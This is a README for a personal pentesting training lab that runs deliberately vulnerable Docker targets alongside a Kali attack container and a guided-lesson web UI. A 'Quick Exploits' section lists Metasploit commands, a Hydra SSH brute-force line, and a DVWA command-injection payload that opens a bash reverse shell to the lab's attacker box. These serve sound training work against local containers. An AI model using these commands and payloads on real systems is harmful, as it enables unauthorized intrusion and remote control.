<p align="center">
  <img src="assets/wireparkhackerz-logo.png" alt="WireParkHackerz" width="150"/>
</p>

<h1 align="center">
  P3N73S7 L4B
</h1>

<p align="center">
  <b>[ Portable Pentesting Environment ]</b><br>
  <i>Clone -> Install -> Pwn</i>
</p>

```
    ██╗    ██╗██╗██████╗ ███████╗██████╗  █████╗ ██████╗ ██╗  ██╗
    ██║    ██║██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
    ██║ █╗ ██║██║██████╔╝█████╗  ██████╔╝███████║██████╔╝█████╔╝
    ██║███╗██║██║██╔══██╗██╔══╝  ██╔═══╝ ██╔══██║██╔══██╗██╔═██╗
    ╚███╔███╔╝██║██║  ██║███████╗██║     ██║  ██║██║  ██║██║  ██╗
     ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                    H A C K E R Z
```

---

## 0x00 // WTF IS THIS?

This repo **captures your entire pentesting environment**.

- Clone it on a fresh Mac
- Run `./install.sh`
- All your tools, configs, and targets are restored

**Not a script. Not an app. An ENVIRONMENT.**

---

## 0x01 // TL;DR - JUST GET ME HACKING

```bash
# Already have everything installed? Just run:
source ~/.bashrc
lab                    # Starts Lab UI at http://localhost:5050
kali                   # Drops into Kali attack box
```

**Three URLs to remember:**
| URL | What |
|-----|------|
| http://localhost:5050 | Lab UI - Wizard interface with guided lessons |
| http://localhost:7681 | Kali Terminal - Full Kali in your browser |
| http://localhost:9999 | Dozzle - Docker log viewer |

---

## 0x02 // INSTALL THESE FIRST (Required)

> This repo syncs CONFIGS, not tools. Install these manually:

```bash
# CORE ARSENAL
brew install metasploit nmap

# SET (Social Engineering Toolkit)
git clone https://github.com/trustedsec/social-engineer-toolkit.git ~/set
pip3 install --user --break-system-packages -r ~/set/requirements.txt

# EXTENDED ARSENAL
brew install hydra john-jumbo sqlmap nikto gobuster hashcat wireshark

# Docker Desktop - download from docker.com
```

### Tool Matrix

| Tool | Command | Purpose | Config Saved? |
|------|---------|---------|:-------------:|
| **Metasploit** | `msfconsole` / `ms` | Exploitation framework | Yes |
| **SET** | `settool` | Social engineering | Yes |
| **Hydra** | `hydra` | Brute force services | - |
| **John** | `john` | Crack password hashes | - |
| **SQLMap** | `sqlmap` | SQL injection | - |
| **Nmap** | `nmap` | Port scanning | - |
| **Nikto** | `nikto` | Web server scanner | - |
| **Gobuster** | `gobuster` | Directory brute force | - |

---

## 0x03 // QUICK START

```bash
# Clone with wordlists
git clone --recursive git@github.com:nixfred/metasploit.git ~/Projects/metasploit
cd ~/Projects/metasploit

# Link your configs
./install.sh

# Source the aliases
source ~/.bashrc

# Start the Lab UI
lab

# Open browser to http://localhost:5050
```

---

## 0x04 // THE LAB UI (Your Command Center)

The Lab UI is a **wizard-style web interface** that guides you through pentesting exercises.

### Starting the Lab

```bash
lab                    # Alias - starts Flask on port 5050
# OR manually:
cd ~/Projects/metasploit/lab-ui && python3 app.py
```

### What You See

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        P3N73S7 L4B                                          │
│                                                                             │
│   Welcome to the Pentesting Learning Lab                                    │
│                                                                             │
│   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                        │
│   │  Kali Box   │  │  Vulnerable │  │   Guided    │                        │
│   │  Full Kali  │  │   Targets   │  │   Lessons   │                        │
│   │  in browser │  │  13+ systems│  │  Copy/paste │                        │
│   └─────────────┘  └─────────────┘  └─────────────┘                        │
│                                                                             │
│   System Status:                                                            │
│   [x] Docker Running    [x] Kali Ready                                     │
│                                                                             │
│   Running Targets (if any):                                                │
│   ┌─────────────────────────────────────────┐                              │
│   │ dvwa        [Stop]  juiceshop  [Stop]  │                              │
│   │        [ Stop All Targets ]             │                              │
│   └─────────────────────────────────────────┘                              │
│                                                                             │
│                    [ Choose Your Target -> ]                                │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Container Lifecycle

| Container | Behavior |
|-----------|----------|
| **Kali** | Always running (`restart: always`) - your attack box |
| **Targets** | Start via lesson "Start" button, shown in Running Targets panel |

The **Running Targets** panel appears on the welcome page when you have containers using resources. One-click "Stop All" for cleanup.

### Lesson Interface with Step Tracking

When you pick a lesson, you get a split screen:

```
┌────────────────────────────────┬────────────────────────────────────────────┐
│  LESSON: FTP Backdoor          │  KALI TERMINAL                      [LIVE] │
│  ──────────────────────────    │  ──────────────────────────────────────── │
│  Progress: [████████░░] 80%    │  root@kali:~# msfconsole                   │
│  Step 4 of 5                   │  msf6 > use exploit/unix/ftp/vsftpd...    │
│                                │  msf6 > set RHOSTS 172.20.0.15            │
│  Step 4: Run the exploit       │  msf6 > run                               │
│  ┌──────────────────────────┐  │  [*] Command shell session 1 opened       │
│  │ run                      │  │                                           │
│  │                   [COPY] │  │  whoami                                   │
│  └──────────────────────────┘  │  root                                     │
│                                │                                           │
│  [x] Step 1 (completed)        │                                           │
│  [x] Step 2 (completed)        │                                           │
│  [x] Step 3 (completed)        │                                           │
│  [>] Step 4 (CURRENT)          │                                           │
│  [ ] Step 5                    │                                           │
└────────────────────────────────┴────────────────────────────────────────────┘
```

**Step Tracking Features:**
- **Progress bar** at top shows percentage complete
- **Active step** has green glow and "CURRENT" badge
- **Completed steps** are dimmed with strikethrough
- **Copy button** automatically marks step as current
- **Checkmark button** to manually mark steps done
- **Duration tags** show time estimates for slow commands (purple badge)
- **Session-only** - resets on page refresh for clean starts

### Available Lessons (8 Total)

| Lesson | Target | Difficulty | What You Learn |
|--------|--------|------------|----------------|
| vsftpd Backdoor | vsftpd | Easy | Metasploit basics, backdoor exploitation |
| SSH Brute Force | vulnssh | Easy | Hydra, password attacks |
| DVWA SQL Injection | dvwa | Easy | Manual SQLi, authentication bypass |
| Tomcat Manager Upload | tomcat | Medium | Web app exploitation, WAR deployment |
| DVWA Command Injection | dvwa | Easy | OS command injection, reverse shells |
| Juice Shop SQLi | juiceshop | Easy | Modern web app SQLi, OWASP |
| SambaCry CVE-2017-7494 | samba | Medium | CVE exploitation, Meterpreter |
| Metasploitable2 DistCC | metasploitable2 | Easy | Service exploitation, daemon vulnerabilities |

---

## 0x05 // KALI ATTACK BOX

The Kali container is your **persistent attack platform**.

### Quick Access

```bash
kali                   # Shell function - starts container if needed, drops you in
# OR via browser:
open http://localhost:7681
```

### What's Inside

| Tool | Purpose |
|------|---------|
| Metasploit | Exploitation framework |
| Nmap | Port scanning |
| Hydra | Service brute forcing |
| John the Ripper | Password cracking |
| SQLMap | SQL injection |
| Nikto | Web server scanning |
| Gobuster | Directory brute forcing |
| ttyd | Web terminal server |

### Persistence

Everything in `/root` survives container restarts and rebuilds:
- Shell history
- Metasploit database
- Downloaded tools
- Your scripts and notes
- Loot and captures

### Shared Configs

The Kali container mounts your configs from the repo:

```
YOUR MAC                          KALI CONTAINER
─────────────────────────────────────────────────────────
~/Projects/metasploit/
├── msf-dotfiles/  ─────────────► /root/.msf4/
│   ├── msfconsole.rc             (startup config)
│   ├── modules/                  (custom exploits)
│   ├── scripts/                  (resource scripts)
│   └── plugins/                  (plugins)
│
└── wordlists/     ─────────────► /root/wordlists/ (read-only)
    └── seclists/                 (SecLists)
```

**Edit in either place -> Changes go to repo -> Git tracks it**

### Auto-Start Behavior

With `restart: always` in docker-compose.yml:
1. Docker Desktop starts on Mac login (if configured)
2. Kali container starts automatically with Docker
3. Open http://localhost:7681 anytime - it's there

---

## 0x06 // REMOTE ACCESS (Tailscale)

Access your lab from **anywhere** via Tailscale.

### What's Exposed

| URL | Binding | Tailscale Access |
|-----|---------|------------------|
| http://\<tailscale-ip\>:5050 | `0.0.0.0:5050` | Lab UI |
| http://\<tailscale-ip\>:7681 | `0.0.0.0:7681` | Kali Terminal |

### Architecture

```
iPad / Phone / Laptop (anywhere)
         │
         ▼ (Tailscale VPN)
    Your Mac (shaggy)
    ├── :5050 Lab UI
    ├── :7681 Kali Terminal
    │        │
    │        ▼ (Docker network 172.20.0.x)
    │   Vulnerable Targets
    │   ├── DVWA      172.20.0.10
    │   ├── vsftpd    172.20.0.15
    │   ├── Samba     172.20.0.16
    │   └── ... (all targets)
    │
    └── Attacks go FROM Kali TO targets (safe)
```

**Security Note:** Target containers are bound to `127.0.0.1` - only accessible FROM Kali, not directly over Tailscale. This is intentional.

### Setup

1. Install Tailscale on your Mac
2. Start Docker and Kali
3. Find your Tailscale IP: `tailscale ip -4`
4. Access from any device: `http://<tailscale-ip>:5050`

---

## 0x07 // TARGET NETWORK

```
┌─────────────────────────────────────────────────────────────────────────┐
│  VULNERABLE NETWORK: 172.20.0.0/24                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  YOUR MAC ───────────────────────────────────────┐                      │
│  172.20.0.1 (gateway)                            │                      │
│  msfconsole, hydra, john, nmap, sqlmap           │                      │
│                                                  ▼                      │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                     KALI ATTACK BOX                             │    │
│  │                     172.20.0.5                                  │    │
│  │                     http://localhost:7681                       │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                                    │                                    │
│                                    ▼                                    │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                     T4RG3TS                                     │    │
│  ├────────────────────────────────────────────────────────────────┤    │
│  │ .10  DVWA             │ SQLi, XSS, Command Injection           │    │
│  │ .15  vsftpd 2.3.4     │ BACKDOOR - EASY ROOT                   │    │
│  │ .16  SambaCry         │ CVE-2017-7494                          │    │
│  │ .17  Vuln SSH         │ Brute force -> Hydra/John              │    │
│  │ .18  MySQL            │ root/root                              │    │
│  │ .19  Tomcat           │ Manager upload                         │    │
│  │ .20  Metasploitable2  │ Multi-vuln classic                     │    │
│  │ .30  Juice Shop       │ Modern OWASP Top 10                    │    │
│  │ .40  WebGoat          │ OWASP training                         │    │
│  │ .50  Mutillidae       │ OWASP practice                         │    │
│  │ .60  WordPress        │ Plugin vulns                           │    │
│  │ .70  bWAPP            │ 100+ web vulns                         │    │
│  │ .100 Cowrie           │ Honeypot                               │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Start Targets

```bash
docker-compose up vsftpd -d        # Easy win
docker-compose up dvwa vulnssh -d  # Web + brute force
docker-compose up -d               # ALL targets (heavy)
docker-compose down                # Clean up
```

### Localhost Ports (for browser access)

| Target | URL | Credentials |
|--------|-----|-------------|
| DVWA | http://localhost:8080 | admin / password |
| Juice Shop | http://localhost:3000 | - |
| WebGoat | http://localhost:8081 | - |
| Mutillidae | http://localhost:8082 | - |
| WordPress | http://localhost:8083 | - |
| bWAPP | http://localhost:8072 | bee / bug |
| Tomcat | http://localhost:8019 | tomcat / tomcat |
| Metasploitable2 | http://localhost:2280 | - |
| Dozzle (logs) | http://localhost:9999 | - |

---

## 0x08 // SHELL ALIASES & FUNCTIONS

Add to `~/.bashrc` (or they're already there if you followed setup):

```bash
# Quick Metasploit
alias ms='msfconsole'

# SET (NOT 'set' - conflicts with bash builtin!)
alias settool='cd ~/set && sudo python3 setoolkit'

# Lab UI - starts Flask on port 5050
alias lab='cd ~/Projects/metasploit/lab-ui && python3 app.py'

# Kali Attack Box - starts container if needed, drops into bash
kali() {
    local project_dir="$HOME/Projects/metasploit"

    if ! docker info >/dev/null 2>&1; then
        echo "Docker is not running. Please start Docker Desktop."
        return 1
    fi

    if ! docker ps --format '{{.Names}}' | grep -q '^kali$'; then
        echo "Starting Kali Attack Box..."
        (cd "$project_dir" && docker-compose up -d kali 2>/dev/null)
        sleep 2
    fi

    echo "Entering Kali Attack Box..."
    echo "   Type 'ms' for Metasploit, 'settool' for SET"
    echo "   Web terminal: http://localhost:7681"
    docker exec -it kali bash
}

# Docker credential helpers (fixes image pull issues)
export PATH="$PATH:/Applications/Docker.app/Contents/Resources/bin"
```

---

## 0x09 // PROJECT STRUCTURE

```
metasploit/
├── assets/                    # Logos, images
├── msf-dotfiles/              # Metasploit configs (SHARED Mac + Kali)
│   ├── msfconsole.rc          # Startup commands
│   ├── modules/               # Custom exploits
│   ├── plugins/               # Plugins
│   └── scripts/               # Resource scripts (.rc)
├── set-config/                # SET configuration
├── wordlists/
│   └── seclists/              # SecLists (Git submodule)
├── targets/
│   └── vsftpd/                # Custom vsftpd 2.3.4 Dockerfile
├── lab-ui/                    # Web UI with guided lessons
│   ├── app.py                 # Flask backend (port 5050)
│   ├── requirements.txt       # Python deps (flask)
│   ├── templates/
│   │   ├── index.html         # Wizard welcome page
│   │   └── lesson.html        # Lesson page with step tracking
│   ├── static/
│   │   ├── style.css          # Dark hacker theme
│   │   └── favicon.svg        # Terminal-themed favicon
│   └── lessons/               # JSON lesson definitions
│       ├── vsftpd-backdoor.json
│       ├── ssh-bruteforce.json
│       ├── sqli-dvwa.json
│       ├── tomcat-upload.json
│       ├── dvwa-command-injection.json
│       ├── juiceshop-sqli.json
│       ├── sambacry.json
│       └── metasploitable2-distcc.json
├── kali/                      # Kali attack box
│   └── Dockerfile             # Full Kali with ttyd
├── docs/
│   ├── CHEATSHEET.md          # Exploit commands
│   └── MS_CUSTOMIZATION.md    # Full MS reference
├── docker-compose.yml         # 13 targets + Kali + Dozzle
├── install.sh                 # Symlink configs
├── uninstall.sh               # Remove symlinks
├── CLAUDE.md                  # AI assistant context
├── HISTORY.md                 # Project evolution log
└── README.md                  # This file
```

---

## 0x0A // SECLISTS SUBMODULE

SecLists is linked via **Git Submodule** - a pointer to another repo:

```
YOUR REPO (small)                    SECLISTS REPO (1.5GB)
┌─────────────────┐                  ┌─────────────────────┐
│ wordlists/      │                  │ danielmiessler/     │
│   seclists/ ────┼──── POINTER ────►│ SecLists            │
│   (just a link) │                  │ (full wordlists)    │
└─────────────────┘                  └─────────────────────┘
```

**Commands:**
```bash
# Clone with submodules
git clone --recursive <repo>

# Or if already cloned:
git submodule init && git submodule update

# Update SecLists to latest
git submodule update --remote wordlists/seclists
```

**Using wordlists:**
```bash
# From Kali (mounted at /root/wordlists)
hydra -l root -P /root/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17

# From Mac
hydra -l root -P wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17
```

---

## 0x0B // QUICK EXPLOITS

### vsftpd 2.3.4 Backdoor (Start Here)
```
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 172.20.0.15
msf6> run
# === ROOT SHELL ===
```

### SSH Brute Force (Hydra)
```bash
hydra -l root -P wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17
# Creds: root/root (yes, really)
```

### DVWA Command Injection
```bash
# In DVWA Command Injection form:
127.0.0.1; id
# Then get a reverse shell:
127.0.0.1; bash -i >& /dev/tcp/172.20.0.5/4444 0>&1
```

### SambaCry (CVE-2017-7494)
```
msf6> use exploit/linux/samba/is_known_pipename
msf6> set RHOSTS 172.20.0.16
msf6> set LHOST 172.20.0.5
msf6> run
# === ROOT via Meterpreter ===
```

### Tomcat Manager Upload
```
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6> set RHOSTS 172.20.0.19
msf6> set HttpUsername tomcat
msf6> set HttpPassword tomcat
msf6> run
```

**Full exploit list:** `docs/CHEATSHEET.md`

---

## 0x0C // NEW MAC SETUP (Complete Checklist)

### 1. Prerequisites

```bash
# Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Docker Desktop - download from https://docker.com
# After install: Open it, let it start, close it
# Enable auto-start: System Preferences -> Users & Groups -> Login Items -> Add Docker

# Python 3 (usually pre-installed)
python3 --version
```

### 2. Install Pentesting Tools

```bash
# Core
brew install metasploit nmap

# Extended
brew install hydra john-jumbo sqlmap nikto gobuster hashcat wireshark

# SET
git clone https://github.com/trustedsec/social-engineer-toolkit.git ~/set
pip3 install --user --break-system-packages -r ~/set/requirements.txt
```

### 3. Clone This Repo

```bash
git clone --recursive git@github.com:nixfred/metasploit.git ~/Projects/metasploit
cd ~/Projects/metasploit
./install.sh
```

### 4. Add Shell Aliases

The install script should prompt you, but if not:

```bash
cat >> ~/.bashrc << 'EOF'

# === P3N73S7 L4B ===
alias ms='msfconsole'
alias settool='cd ~/set && sudo python3 setoolkit'
alias lab='cd ~/Projects/metasploit/lab-ui && python3 app.py'
export PATH="$PATH:/Applications/Docker.app/Contents/Resources/bin"

kali() {
    local project_dir="$HOME/Projects/metasploit"
    if ! docker info >/dev/null 2>&1; then
        echo "Docker is not running. Please start Docker Desktop."
        return 1
    fi
    if ! docker ps --format '{{.Names}}' | grep -q '^kali$'; then
        echo "Starting Kali Attack Box..."
        (cd "$project_dir" && docker-compose up -d kali 2>/dev/null)
        sleep 2
    fi
    echo "Entering Kali Attack Box..."
    docker exec -it kali bash
}
EOF
source ~/.bashrc
```

### 5. Build Kali (One Time)

```bash
docker-compose up kali -d
# Takes 10-15 mins first time
# After this, Kali auto-starts with Docker Desktop
```

### 6. Pre-Pull All Target Images (Optional but Recommended)

```bash
docker-compose pull
# Takes a while but means instant target starts later
```

### 7. Start Hacking

```bash
lab                    # Start Lab UI
open http://localhost:5050
# Pick a lesson and follow along!
```

---

## 0x0D // TROUBLESHOOTING

### Port 5000 gives 403 error
macOS Monterey+ uses port 5000 for AirPlay Receiver. Lab UI uses **port 5050**.
```bash
# Correct URL:
http://localhost:5050
```

### Docker image won't pull
Docker credential helper not in PATH. Add this to ~/.bashrc:
```bash
export PATH="$PATH:/Applications/Docker.app/Contents/Resources/bin"
source ~/.bashrc
```

### Kali container won't start
```bash
# Check Docker is running
docker info

# Check for errors
docker-compose logs kali

# Force rebuild
docker-compose up -d --force-recreate --build kali
```

### vsftpd container missing
Old Docker Hub image was removed. We now build from source:
```bash
docker-compose build vsftpd
docker-compose up vsftpd -d
```

### Metasploit database not connected
```bash
msfdb reinit   # Reinitialize
msfdb start    # Start PostgreSQL
msfconsole -x "db_status"
```

### Can't reach targets from Mac
```bash
# Check Docker network exists
docker network ls | grep lab

# Check target is running
docker ps | grep dvwa

# Ping from Mac
ping 172.20.0.10
```

---

## 0xFF // LEGAL

```
 ██████╗ ███╗   ██╗██╗  ██╗   ██╗    ██╗      ██████╗  ██████╗ █████╗ ██╗
██╔═══██╗████╗  ██║██║  ╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝██╔══██╗██║
██║   ██║██╔██╗ ██║██║   ╚████╔╝     ██║     ██║   ██║██║     ███████║██║
██║   ██║██║╚██╗██║██║    ╚██╔╝      ██║     ██║   ██║██║     ██╔══██║██║
╚██████╔╝██║ ╚████║███████╗██║       ███████╗╚██████╔╝╚██████╗██║  ██║███████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝       ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝
```

All attacks target **localhost Docker containers only**.
Never use against systems without explicit authorization.

---

<p align="center">
  <b>// HACK THE PLANET //</b>
</p>
